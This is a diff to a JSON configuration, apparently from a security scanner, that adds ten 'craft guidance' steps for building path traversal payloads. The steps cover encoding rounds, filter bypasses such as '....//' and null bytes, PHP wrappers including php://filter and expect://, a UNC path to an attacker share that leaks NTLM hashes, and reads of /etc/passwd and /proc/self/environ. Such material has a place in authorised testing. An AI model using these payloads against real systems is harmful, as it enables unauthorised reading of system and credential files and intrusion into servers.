@@ -1,5 +1,17 @@
 {
   "category": "path_traversal",
+  "craft_guidance": [
+    "1. IDENTIFY OS: Linux (/etc/passwd → root:x:), Windows (C:\\Windows\\win.ini → [fonts]), generic (boot.ini, .htpasswd).",
+    "2. ENCODING ROUNDS: ../, ..%2f, %2e%2e%2f, %252e%252e%252f (double), ..\\..\\, ..%5c. Some servers decode N times; iterate.",
+    "3. FILTER BYPASS: filter strips `../` once → use `....//` or `..././` (filter removes inner, leaves outer). Filter requires .pdf? Try null byte `payload.pdf%00`, or `?file=../../etc/passwd?.pdf`.",
+    "4. ABSOLUTE PATH: skip relative — `/etc/passwd`, `file:///etc/passwd`, `C:\\Windows\\win.ini`.",
+    "5. UNICODE / ZERO-WIDTH: `..\\u002f`, `..\\xc0\\xaf`, RTL override `\\u202e`. Older Java/PHP interpret some.",
+    "6. WRAPPERS: PHP `php://filter/convert.base64-encode/resource=index.php` reads source. `data://`, `expect://`, `phar://` for RCE-adjacent abuse.",
+    "7. WINDOWS UNC: `\\\\attacker\\share\\file` — SSRF / NTLM hash leak via SMB.",
+    "8. AUTOMATIC NORMALIZATION: trailing `/.` or `/. /` confuses routers. `app.js/.` may serve source.",
+    "9. SINK CONFIRMATION: `root:x:`, `[fonts]`, `daemon:`, `/bin/bash` — semantic match, not status alone.",
+    "10. SYMLINK LOOPS: `/proc/self/cwd/`, `/proc/self/environ`, `/proc/self/cmdline` — process intel for chaining."
+  ],
   "contexts": {
     "linux": {
       "description": "Path traversal probes targeting Linux/Unix file systems via common web stacks",
